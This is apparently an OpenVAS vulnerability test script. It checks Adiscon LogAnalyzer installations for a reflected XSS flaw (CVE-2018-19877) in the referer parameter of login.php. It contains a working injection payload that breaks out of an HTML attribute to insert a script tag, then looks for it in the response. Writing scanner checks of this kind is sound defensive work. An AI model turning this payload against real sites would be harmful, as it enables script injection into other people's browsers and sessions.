###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_adiscon_log_analyzer_xss_vuln_dec18.nasl 12938 2019-01-04 07:18:11Z asteins $
#
# Adiscon LogAnalyzer <= 4.1.6 XSS Vulnerability
#
# Authors:
# Jan Philipp Schulte <jan.schulte@greenbone.net>
#
# Copyright:
# Copyright (C) 2018 Greenbone Networks GmbH, https://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation; either version 2 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if( description )
{
  script_oid("1.3.6.1.4.1.25623.1.0.113316");
  script_version("$Revision: 12938 $");
  script_tag(name:"last_modification", value:"$Date: 2019-01-04 08:18:11 +0100 (Fri, 04 Jan 2019) $");
  script_tag(name:"creation_date", value:"2018-12-12 13:10:00 +0100 (Wed, 12 Dec 2018)");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");

  script_tag(name:"qod_type", value:"remote_vul");

  script_tag(name:"solution_type", value:"VendorFix");

  script_cve_id("CVE-2018-19877");

  script_name("Adiscon LogAnalyzer <= 4.1.6 XSS Vulnerability");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2018 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_adiscon_log_analyzer_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("adiscon/log_analyzer/detected");

  script_tag(name:"summary", value:"Adiscon LogAnalyzer is prone to an XSS vulnerability.");
  script_tag(name:"vuldetect", value:"Tries to exploit the vulnerability and inject arbitrary HTML.");
  script_tag(name:"insight", value:"The vulnerability exists within the /login.php page of the site,
  through the referer parameter.");
  script_tag(name:"impact", value:"Successful exploitation would allow an attacker to inject arbitrary
  HTML or JavaScript into the site by crafting a malicious link.");
  script_tag(name:"affected", value:"Adiscon LogAnalyzer through version 4.1.6.");
  script_tag(name:"solution", value:"Update to version 4.1.7 or above.");

  script_xref(name:"URL", value:"https://loganalyzer.adiscon.com/news/loganalyzer-v4-1-7-v4-stable-released/");
  script_xref(name:"URL", value:"https://www.exploit-db.com/exploits/45958");

  exit(0);
}

CPE = "cpe:/a:adiscon:log_analyzer";

include( "host_details.inc" );
include( "http_func.inc" );
include( "http_keepalive.inc" );
include( "misc_func.inc" );
include( "url_func.inc" );

if( ! port = get_app_port( cpe: CPE ) ) exit( 0 );
if( ! location = get_app_location( cpe: CPE, port: port ) ) exit( 0 );

if( location == "/" )
  location = "";

location = location + "/login.php";

vt_strings = get_vt_strings();
rand = vt_strings["default_rand"];

evil = '<script>alert(' + rand + ');</script>';
payload = '%2Findex.php%22%3E' + urlencode( str: evil ) + '%3Cinput%20type%3D%22hidden%22%20name%3D%22none%22%20value%3D%223';

url = location + '?referer=' + payload;

buf = http_get_cache( port: port, item: url );

pattern = 'value="/index.php">' + evil;
pattern = ereg_replace( pattern: "\(", string: pattern, replace: "\(" );
pattern = ereg_replace( pattern: "\)", string: pattern, replace: "\)" );
if( egrep( pattern: pattern, string: buf ) ) {
  report = report_vuln_url( port: port, url: url );
  security_message( data: report, port: port );
  exit( 0 );
}

exit( 99 );
